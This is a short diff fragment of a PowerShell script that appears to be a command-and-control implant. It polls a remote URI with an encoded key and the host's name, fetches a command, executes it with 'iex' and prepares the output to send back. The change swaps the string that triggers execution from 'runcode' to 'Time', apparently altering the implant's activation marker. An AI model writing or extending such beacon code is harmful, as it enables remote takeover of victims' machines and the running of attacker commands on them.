@@ -117,7 +117,7 @@ function main {
 				$getcmd = $uri + "?auth=" + $enckey + "&get=" + $enchostname
 				$cmd = webreq $getcmd
 		
-				if ($cmd -match 'runcode')
+				if ($cmd -match 'Time')
 				{   
 					$sendback = (iex "$cmd" 2>&1 | Out-String )
 					$tstamp = time-stamp
